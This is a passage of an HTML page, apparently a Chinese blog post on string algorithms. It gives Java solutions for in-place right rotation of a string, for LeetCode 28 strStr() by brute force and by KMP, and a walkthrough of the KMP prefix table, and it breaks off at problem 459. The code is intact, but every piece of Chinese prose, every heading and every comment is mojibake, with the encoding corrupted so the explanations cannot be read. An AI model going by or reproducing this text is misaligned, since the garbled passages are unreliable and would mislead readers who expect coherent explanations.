class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="å³æ—‹å­—ç¬¦ä¸²"><a href="#å³æ—‹å­—ç¬¦ä¸²" class="headerlink" title="å³æ—‹å­—ç¬¦ä¸²"></a>å³æ—‹å­—ç¬¦ä¸²</h2><p>å­—ç¬¦ä¸²çš„å³æ—‹è½¬æ“ä½œæ˜¯æŠŠå­—ç¬¦ä¸²å°¾éƒ¨çš„è‹¥å¹²ä¸ªå­—ç¬¦è½¬ç§»åˆ°å­—ç¬¦ä¸²çš„å‰é¢ã€‚ç»™å®šä¸€ä¸ªå­—ç¬¦ä¸² s å’Œä¸€ä¸ªæ­£æ•´æ•° kï¼Œè¯·ç¼–å†™ä¸€ä¸ªå‡½æ•°ï¼Œå°†å­—ç¬¦ä¸²ä¸­çš„åé¢ k ä¸ªå­—ç¬¦ç§»åˆ°å­—ç¬¦ä¸²çš„å‰é¢ï¼Œå®ç°å­—ç¬¦ä¸²çš„å³æ—‹è½¬æ“ä½œã€‚<br>ä¾‹å¦‚ï¼Œå¯¹äºè¾“å…¥å­—ç¬¦ä¸² â€œabcdefgâ€ å’Œæ•´æ•° 2ï¼Œå‡½æ•°åº”è¯¥å°†å…¶è½¬æ¢ä¸º â€œfgabcdeâ€ã€‚<br>è¾“å…¥ï¼šè¾“å…¥å…±åŒ…å«ä¸¤è¡Œï¼Œç¬¬ä¸€è¡Œä¸ºä¸€ä¸ªæ­£æ•´æ•° kï¼Œä»£è¡¨å³æ—‹è½¬çš„ä½æ•°ã€‚ç¬¬äºŒè¡Œä¸ºå­—ç¬¦ä¸² sï¼Œä»£è¡¨éœ€è¦æ—‹è½¬çš„å­—ç¬¦ä¸²ã€‚<br>è¾“å‡ºï¼šè¾“å‡ºå…±ä¸€è¡Œï¼Œä¸ºè¿›è¡Œäº†å³æ—‹è½¬æ“ä½œåçš„å­—ç¬¦ä¸²ã€‚</p><p>è¾“å…¥ç¤ºä¾‹<br>    2<br>    abcdefg<br>è¾“å‡ºç¤ºä¾‹<br>    fgabcde</p><p>ä¸ºäº†è®©æœ¬é¢˜æ›´æœ‰æ„ä¹‰ï¼Œæå‡ä¸€ä¸‹æœ¬é¢˜éš¾åº¦ï¼šä¸èƒ½ç”³è¯·é¢å¤–ç©ºé—´ï¼Œåªèƒ½åœ¨æœ¬ä¸²ä¸Šæ“ä½œã€‚ ï¼ˆJavaä¸èƒ½åœ¨å­—ç¬¦ä¸²ä¸Šä¿®æ”¹ï¼Œæ‰€ä»¥ä½¿ç”¨javaä¸€å®šè¦å¼€è¾Ÿæ–°ç©ºé—´ï¼‰<br>ä¸èƒ½ä½¿ç”¨é¢å¤–ç©ºé—´çš„è¯ï¼Œæ¨¡æ‹Ÿåœ¨æœ¬ä¸²æ“ä½œè¦å®ç°å³æ—‹è½¬å­—ç¬¦ä¸²çš„åŠŸèƒ½è¿˜æ˜¯æœ‰ç‚¹å›°éš¾çš„ã€‚</p><p>å…¶å®ä¸¤æ®µåè½¬å°±å¯ä»¥è§£å†³è¿™ä¸ªé—®é¢˜äº†</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ç‰ˆæœ¬ä¸€</span></span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Scanner</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> Integer.parseInt(in.nextLine());</span><br><span class="line">        <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> in.nextLine();</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> s.length();  <span class="comment">//è·å–å­—ç¬¦ä¸²é•¿åº¦</span></span><br><span class="line">        <span class="type">char</span>[] chars = s.toCharArray();</span><br><span class="line">        reverseString(chars, <span class="number">0</span>, len - <span class="number">1</span>);  <span class="comment">//åè½¬æ•´ä¸ªå­—ç¬¦ä¸²</span></span><br><span class="line">        reverseString(chars, <span class="number">0</span>, n - <span class="number">1</span>);  <span class="comment">//åè½¬å‰ä¸€æ®µå­—ç¬¦ä¸²ï¼Œæ­¤æ—¶çš„å­—ç¬¦ä¸²é¦–å°¾å°¾æ˜¯0,n - 1</span></span><br><span class="line">        reverseString(chars, n, len - <span class="number">1</span>);  <span class="comment">//åè½¬åä¸€æ®µå­—ç¬¦ä¸²ï¼Œæ­¤æ—¶çš„å­—ç¬¦ä¸²é¦–å°¾å°¾æ˜¯n,len - 1</span></span><br><span class="line">        </span><br><span class="line">        System.out.println(chars);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">reverseString</span><span class="params">(<span class="type">char</span>[] ch, <span class="type">int</span> start, <span class="type">int</span> end)</span> &#123;</span><br><span class="line">        <span class="comment">//å¼‚æˆ–æ³•åè½¬å­—ç¬¦ä¸²ï¼Œå‚ç…§é¢˜ç›® 344.åè½¬å­—ç¬¦ä¸²çš„è§£é‡Š</span></span><br><span class="line">        <span class="keyword">while</span> (start &lt; end) &#123;</span><br><span class="line">            ch[start] ^= ch[end];</span><br><span class="line">            ch[end] ^= ch[start];</span><br><span class="line">            ch[start] ^= ch[end];</span><br><span class="line">            start++;</span><br><span class="line">            end--;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ç‰ˆæœ¬äºŒ</span></span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Scanner</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> Integer.parseInt(in.nextLine());</span><br><span class="line">        <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> in.nextLine();</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> s.length();  <span class="comment">//è·å–å­—ç¬¦ä¸²é•¿åº¦</span></span><br><span class="line">        <span class="type">char</span>[] chars = s.toCharArray();</span><br><span class="line">        reverseString(chars, <span class="number">0</span>, len - n - <span class="number">1</span>);  <span class="comment">//åè½¬å‰ä¸€æ®µå­—ç¬¦ä¸²ï¼Œæ­¤æ—¶çš„å­—ç¬¦ä¸²é¦–å°¾æ˜¯0,len - n - 1</span></span><br><span class="line">        reverseString(chars, len - n, len - <span class="number">1</span>);  <span class="comment">//åè½¬åä¸€æ®µå­—ç¬¦ä¸²ï¼Œæ­¤æ—¶çš„å­—ç¬¦ä¸²é¦–å°¾æ˜¯len - n,len - 1</span></span><br><span class="line">        reverseString(chars, <span class="number">0</span>, len - <span class="number">1</span>);  <span class="comment">//åè½¬æ•´ä¸ªå­—ç¬¦ä¸²</span></span><br><span class="line"></span><br><span class="line">        System.out.println(chars);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">reverseString</span><span class="params">(<span class="type">char</span>[] ch, <span class="type">int</span> start, <span class="type">int</span> end)</span> &#123;</span><br><span class="line">        <span class="comment">//å¼‚æˆ–æ³•åè½¬å­—ç¬¦ä¸²ï¼Œå‚ç…§é¢˜ç›® 344.åè½¬å­—ç¬¦ä¸²çš„è§£é‡Š</span></span><br><span class="line">        <span class="keyword">while</span> (start &lt; end) &#123;</span><br><span class="line">            ch[start] ^= ch[end];</span><br><span class="line">            ch[end] ^= ch[start];</span><br><span class="line">            ch[start] ^= ch[end];</span><br><span class="line">            start++;</span><br><span class="line">            end--;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="28-å®ç°-strStr"><a href="#28-å®ç°-strStr" class="headerlink" title="28. å®ç° strStr()"></a>28. å®ç° strStr()</h2><p>ç»™ä½ ä¸¤ä¸ªå­—ç¬¦ä¸² haystack å’Œ needle ï¼Œè¯·ä½ åœ¨ haystack å­—ç¬¦ä¸²ä¸­æ‰¾å‡º needle å­—ç¬¦ä¸²çš„ç¬¬ä¸€ä¸ªåŒ¹é…é¡¹çš„ä¸‹æ ‡ï¼ˆä¸‹æ ‡ä» 0 å¼€å§‹ï¼‰ã€‚å¦‚æœ needle ä¸æ˜¯ haystack çš„ä¸€éƒ¨åˆ†ï¼Œåˆ™è¿”å›  -1 ã€‚</p><p>ç¤ºä¾‹ 1ï¼š<br>è¾“å…¥ï¼šhaystack &#x3D; â€œsadbutsadâ€, needle &#x3D; â€œsadâ€<br>è¾“å‡ºï¼š0<br>è§£é‡Šï¼šâ€sadâ€ åœ¨ä¸‹æ ‡ 0 å’Œ 6 å¤„åŒ¹é…ã€‚<br>ç¬¬ä¸€ä¸ªåŒ¹é…é¡¹çš„ä¸‹æ ‡æ˜¯ 0 ï¼Œæ‰€ä»¥è¿”å› 0 ã€‚</p><p>ç¤ºä¾‹ 2ï¼š<br>è¾“å…¥ï¼šhaystack &#x3D; â€œleetcodeâ€, needle &#x3D; â€œleetoâ€<br>è¾“å‡ºï¼š-1<br>è§£é‡Šï¼šâ€leetoâ€ æ²¡æœ‰åœ¨ â€œleetcodeâ€ ä¸­å‡ºç°ï¼Œæ‰€ä»¥è¿”å› -1 ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * åŸºäºçª—å£æ»‘åŠ¨çš„ç®—æ³•</span></span><br><span class="line"><span class="comment">     * &lt;p&gt;</span></span><br><span class="line"><span class="comment">     * æ—¶é—´å¤æ‚åº¦ï¼šO(m*n)</span></span><br><span class="line"><span class="comment">     * ç©ºé—´å¤æ‚åº¦ï¼šO(1)</span></span><br><span class="line"><span class="comment">     * æ³¨ï¼šnä¸ºhaystackçš„é•¿åº¦ï¼Œmä¸ºneedleçš„é•¿åº¦</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">strStr</span><span class="params">(String haystack, String needle)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">m</span> <span class="operator">=</span> needle.length();</span><br><span class="line">        <span class="comment">// å½“needleæ˜¯ç©ºå­—ç¬¦ä¸²æ—¶æˆ‘ä»¬åº”å½“è¿”å›0</span></span><br><span class="line">        <span class="keyword">if</span>(m == <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> haystack.length();</span><br><span class="line">        <span class="keyword">if</span>(n &lt; m)&#123;</span><br><span class="line">            <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(i &lt; n-m+<span class="number">1</span>)&#123;</span><br><span class="line">            <span class="comment">//æ‰¾åˆ°é¦–å­—æ¯ç›¸ç­‰</span></span><br><span class="line">            <span class="keyword">while</span>(i &lt; n &amp;&amp; haystack.charAt(i) != needle.charAt(j))&#123;</span><br><span class="line">                i++;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(i == n)&#123;</span><br><span class="line">                <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// éå†åç»­å­—ç¬¦ï¼Œåˆ¤æ–­æ˜¯å¦ç›¸ç­‰</span></span><br><span class="line">            i++;</span><br><span class="line">            j++;</span><br><span class="line">            <span class="keyword">while</span>(i &lt; n &amp;&amp; j &lt; m &amp;&amp; haystack.charAt(i) == needle.charAt(j))&#123;</span><br><span class="line">                i++;</span><br><span class="line">                j++;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(j == m)&#123;</span><br><span class="line">                <span class="keyword">return</span> i-j;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                i -= j - <span class="number">1</span>;</span><br><span class="line">                j = <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// KMPè§£æ³•ï¼Œnextæ•°ç»„é¦–ä½-1çš„æ–¹æ³•</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">getNext</span><span class="params">(<span class="type">int</span>[] next, String s)</span>&#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> -<span class="number">1</span>;</span><br><span class="line">        next[<span class="number">0</span>] = j;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt; s.length(); i++)&#123;</span><br><span class="line">            <span class="keyword">while</span>(j &gt;= <span class="number">0</span> &amp;&amp; s.charAt(i) != s.charAt(j+<span class="number">1</span>))&#123;</span><br><span class="line">                j = next[j];</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(s.charAt(i) == s.charAt(j+<span class="number">1</span>))&#123;</span><br><span class="line">                j++;</span><br><span class="line">            &#125;</span><br><span class="line">            next[i] = j;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">strStr</span><span class="params">(String haystack, String needle)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(needle.length() == <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span>[] next = <span class="keyword">new</span> <span class="title class_">int</span>[needle.length()];</span><br><span class="line">        getNext(next, needle);</span><br><span class="line">        <span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> -<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; haystack.length(); i++)&#123;</span><br><span class="line">            <span class="keyword">while</span>(j &gt;= <span class="number">0</span> &amp;&amp; haystack.charAt(i) != needle.charAt(j+<span class="number">1</span>))&#123;</span><br><span class="line">                j = next[j];</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(haystack.charAt(i) == needle.charAt(j+<span class="number">1</span>))&#123;</span><br><span class="line">                j++;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(j == needle.length() - <span class="number">1</span>)&#123;</span><br><span class="line">                <span class="keyword">return</span> (i-needle.length() + <span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="KMPç®—æ³•"><a href="#KMPç®—æ³•" class="headerlink" title="KMPç®—æ³•"></a>KMPç®—æ³•</h3><p>è¿™é“é¢˜å…¶å®æ ¸å¿ƒç®—æ³•æ˜¯KMPç®—æ³•,å†™è¿‡KMPçš„åŒå­¦ï¼Œä¸€å®šéƒ½å†™è¿‡nextæ•°ç»„ï¼Œé‚£ä¹ˆè¿™ä¸ªnextæ•°ç»„ç©¶ç«Ÿæ˜¯ä¸ªå•¥å‘¢ï¼Ÿnextæ•°ç»„å°±æ˜¯ä¸€ä¸ªå‰ç¼€è¡¨ï¼ˆprefix tableï¼‰ã€‚<br>å‰ç¼€è¡¨æœ‰ä»€ä¹ˆä½œç”¨å‘¢ï¼Ÿå‰ç¼€è¡¨æ˜¯ç”¨æ¥å›é€€çš„ï¼Œå®ƒè®°å½•äº†æ¨¡å¼ä¸²ä¸ä¸»ä¸²(æ–‡æœ¬ä¸²)ä¸åŒ¹é…çš„æ—¶å€™ï¼Œæ¨¡å¼ä¸²åº”è¯¥ä»å“ªé‡Œå¼€å§‹é‡æ–°åŒ¹é…ã€‚<br>ä¸ºäº†æ¸…æ¥šåœ°äº†è§£å‰ç¼€è¡¨çš„æ¥å†ï¼Œæˆ‘ä»¬æ¥ä¸¾ä¸€ä¸ªä¾‹å­ï¼š<br>è¦åœ¨æ–‡æœ¬ä¸²ï¼šaabaabaafa ä¸­æŸ¥æ‰¾æ˜¯å¦å‡ºç°è¿‡ä¸€ä¸ªæ¨¡å¼ä¸²ï¼šaabaafã€‚å‰ç¼€è¡¨æ˜¯å¦‚ä½•è®°å½•çš„å‘¢ï¼Ÿ<br>é¦–å…ˆè¦çŸ¥é“å‰ç¼€è¡¨çš„ä»»åŠ¡æ˜¯å½“å‰ä½ç½®åŒ¹é…å¤±è´¥ï¼Œæ‰¾åˆ°ä¹‹å‰å·²ç»åŒ¹é…ä¸Šçš„ä½ç½®ï¼Œå†é‡æ–°åŒ¹é…ï¼Œæ­¤ä¹Ÿæ„å‘³ç€åœ¨æŸä¸ªå­—ç¬¦å¤±é…æ—¶ï¼Œå‰ç¼€è¡¨ä¼šå‘Šè¯‰ä½ ä¸‹ä¸€æ­¥åŒ¹é…ä¸­ï¼Œæ¨¡å¼ä¸²åº”è¯¥è·³åˆ°å“ªä¸ªä½ç½®ã€‚<br>é‚£ä¹ˆä»€ä¹ˆæ˜¯å‰ç¼€è¡¨ï¼šè®°å½•ä¸‹æ ‡iä¹‹å‰ï¼ˆåŒ…æ‹¬iï¼‰çš„å­—ç¬¦ä¸²ä¸­ï¼Œæœ‰å¤šå¤§é•¿åº¦çš„ç›¸åŒå‰ç¼€åç¼€ã€‚</p><p>åˆšåˆšåŒ¹é…çš„è¿‡ç¨‹åœ¨ä¸‹æ ‡5çš„åœ°æ–¹é‡åˆ°ä¸åŒ¹é…ï¼Œæ¨¡å¼ä¸²æ˜¯æŒ‡å‘fï¼Œå¦‚å›¾ï¼š<br><img src="/2024/10/16/algorithm/string/image-2.png"><br>ç„¶åå°±æ‰¾åˆ°äº†ä¸‹æ ‡2ï¼ŒæŒ‡å‘bï¼Œç»§ç»­åŒ¹é…ï¼šå¦‚å›¾ï¼š<br><img src="/2024/10/16/algorithm/string/image-3.png"><br>ä¸‹æ ‡5ä¹‹å‰è¿™éƒ¨åˆ†çš„å­—ç¬¦ä¸²ï¼ˆä¹Ÿå°±æ˜¯å­—ç¬¦ä¸²aabaaï¼‰çš„æœ€é•¿ç›¸ç­‰çš„å‰ç¼€ å’Œ åç¼€å­—ç¬¦ä¸²æ˜¯ å­å­—ç¬¦ä¸²aa ï¼Œå› ä¸ºæ‰¾åˆ°äº†æœ€é•¿ç›¸ç­‰çš„å‰ç¼€å’Œåç¼€ï¼ŒåŒ¹é…å¤±è´¥çš„ä½ç½®æ˜¯åç¼€å­ä¸²çš„åé¢ï¼Œé‚£ä¹ˆæˆ‘ä»¬æ‰¾åˆ°ä¸å…¶ç›¸åŒçš„å‰ç¼€çš„åé¢é‡æ–°åŒ¹é…å°±å¯ä»¥äº†</p><p>å¦‚ä½•è®¡ç®—å‰ç¼€è¡¨<br><img src="/2024/10/16/algorithm/string/image-4.png"><br>é•¿åº¦ä¸ºå‰1ä¸ªå­—ç¬¦çš„å­ä¸²aï¼Œæœ€é•¿ç›¸åŒå‰åç¼€çš„é•¿åº¦ä¸º0ã€‚ï¼ˆæ³¨æ„å­—ç¬¦ä¸²çš„å‰ç¼€æ˜¯æŒ‡ä¸åŒ…å«æœ€åä¸€ä¸ªå­—ç¬¦çš„æ‰€æœ‰ä»¥ç¬¬ä¸€ä¸ªå­—ç¬¦å¼€å¤´çš„è¿ç»­å­ä¸²ï¼›åç¼€æ˜¯æŒ‡ä¸åŒ…å«ç¬¬ä¸€ä¸ªå­—ç¬¦çš„æ‰€æœ‰ä»¥æœ€åä¸€ä¸ªå­—ç¬¦ç»“å°¾çš„è¿ç»­å­ä¸²ã€‚ï¼‰<br><img src="/2024/10/16/algorithm/string/image-5.png"><br>é•¿åº¦ä¸ºå‰2ä¸ªå­—ç¬¦çš„å­ä¸²aaï¼Œæœ€é•¿ç›¸åŒå‰åç¼€çš„é•¿åº¦ä¸º1ã€‚<br><img src="/2024/10/16/algorithm/string/image-6.png"><br>é•¿åº¦ä¸ºå‰3ä¸ªå­—ç¬¦çš„å­ä¸²aabï¼Œæœ€é•¿ç›¸åŒå‰åç¼€çš„é•¿åº¦ä¸º0ã€‚<br>ä»¥æ­¤ç±»æ¨ï¼š é•¿åº¦ä¸ºå‰4ä¸ªå­—ç¬¦çš„å­ä¸²aabaï¼Œæœ€é•¿ç›¸åŒå‰åç¼€çš„é•¿åº¦ä¸º1ã€‚ é•¿åº¦ä¸ºå‰5ä¸ªå­—ç¬¦çš„å­ä¸²aabaaï¼Œæœ€é•¿ç›¸åŒå‰åç¼€çš„é•¿åº¦ä¸º2ã€‚ é•¿åº¦ä¸ºå‰6ä¸ªå­—ç¬¦çš„å­ä¸²aabaafï¼Œæœ€é•¿ç›¸åŒå‰åç¼€çš„é•¿åº¦ä¸º0ã€‚<br>é‚£ä¹ˆæŠŠæ±‚å¾—çš„æœ€é•¿ç›¸åŒå‰åç¼€çš„é•¿åº¦å°±æ˜¯å¯¹åº”å‰ç¼€è¡¨çš„å…ƒç´ ï¼Œå¦‚å›¾ï¼š<br><img src="/2024/10/16/algorithm/string/image-7.png"><br>å¯ä»¥çœ‹å‡ºæ¨¡å¼ä¸²ä¸å‰ç¼€è¡¨å¯¹åº”ä½ç½®çš„æ•°å­—è¡¨ç¤ºçš„å°±æ˜¯ï¼šä¸‹æ ‡iä¹‹å‰ï¼ˆåŒ…æ‹¬iï¼‰çš„å­—ç¬¦ä¸²ä¸­ï¼Œæœ‰å¤šå¤§é•¿åº¦çš„ç›¸åŒå‰ç¼€åç¼€ã€‚</p><p>å‰ç¼€è¡¨ä¸nextæ•°ç»„<br>å¾ˆå¤šKMPç®—æ³•çš„å®ç°éƒ½æ˜¯ä½¿ç”¨nextæ•°ç»„æ¥åšå›é€€æ“ä½œï¼Œé‚£ä¹ˆnextæ•°ç»„ä¸å‰ç¼€è¡¨æœ‰ä»€ä¹ˆå…³ç³»å‘¢ï¼Ÿ<br>nextæ•°ç»„å°±å¯ä»¥æ˜¯å‰ç¼€è¡¨ï¼Œä½†æ˜¯å¾ˆå¤šå®ç°éƒ½æ˜¯æŠŠå‰ç¼€è¡¨ç»Ÿä¸€å‡ä¸€ï¼ˆå³ç§»ä¸€ä½ï¼Œåˆå§‹ä½ç½®ä¸º-1ï¼‰ä¹‹åä½œä¸ºnextæ•°ç»„ã€‚<br>ä¸ºä»€ä¹ˆè¿™ä¹ˆåšå‘¢ï¼Œå…¶å®è¿™å¹¶ä¸æ¶‰åŠåˆ°KMPçš„åŸç†ï¼Œè€Œæ˜¯å…·ä½“å®ç°ï¼Œnextæ•°ç»„æ—¢å¯ä»¥å°±æ˜¯å‰ç¼€è¡¨ï¼Œä¹Ÿå¯ä»¥æ˜¯å‰ç¼€è¡¨ç»Ÿä¸€å‡ä¸€ï¼ˆå³ç§»ä¸€ä½ï¼Œåˆå§‹ä½ç½®ä¸º-1ï¼‰ã€‚</p><p>æ—¶é—´å¤æ‚åº¦åˆ†æï¼šå…¶ä¸­nä¸ºæ–‡æœ¬ä¸²é•¿åº¦ï¼Œmä¸ºæ¨¡å¼ä¸²é•¿åº¦ï¼Œå› ä¸ºåœ¨åŒ¹é…çš„è¿‡ç¨‹ä¸­ï¼Œæ ¹æ®å‰ç¼€è¡¨ä¸æ–­è°ƒæ•´åŒ¹é…çš„ä½ç½®ï¼Œå¯ä»¥çœ‹å‡ºåŒ¹é…çš„è¿‡ç¨‹æ˜¯O(n)ï¼Œä¹‹å‰è¿˜è¦å•ç‹¬ç”Ÿæˆnextæ•°ç»„ï¼Œæ—¶é—´å¤æ‚åº¦æ˜¯O(m)ã€‚æ‰€ä»¥æ•´ä¸ªKMPç®—æ³•çš„æ—¶é—´å¤æ‚åº¦æ˜¯O(n+m)çš„ã€‚</p><h2 id="459-é‡å¤çš„å­å­—ç¬¦ä¸²"><a href="#459-é‡å¤çš„å­å­—ç¬¦ä¸²" class="headerlink" title="459.é‡å¤çš„å­å­—ç¬¦ä¸²"></a>459.é‡å¤çš„å­å­—ç¬¦ä¸²</h2><p>ç»™å®šä¸€ä¸ªéç©ºçš„å­—ç¬¦ä¸² s ï¼Œæ£€æŸ¥æ˜¯å¦å¯ä»¥é€šè¿‡ç”±å®ƒçš„ä¸€ä¸ªå­ä¸²é‡å¤å¤šæ¬¡æ„æˆã€‚</p><p>ç¤ºä¾‹ 1:<br>è¾“å…¥: s &#x3D; â€œababâ€<br>è¾“å‡º: true<br>è§£é‡Š: å¯ç”±å­ä¸² â€œabâ€ é‡å¤ä¸¤æ¬¡æ„æˆ</p><p>ç¤ºä¾‹ 2:<br>è¾“å…¥: s &#x3D; â€œabaâ€<br>è¾“å‡º: false</p><p>ç¤ºä¾‹ 3:<br>è¾“å…¥: s &#x3D; â€œabcabcabcabcâ€<br>è¾“å‡º: true<br>è§£é‡Š: å¯ç”±å­ä¸² â€œabcâ€ é‡å¤å››æ¬¡æ„æˆã€‚ (æˆ–å­ä¸² â€œabcabcâ€ é‡å¤ä¸¤æ¬¡æ„æˆã€‚)</p><h3 id="æš´åŠ›è§£æ³•"><a href="#æš´åŠ›è§£æ³•" 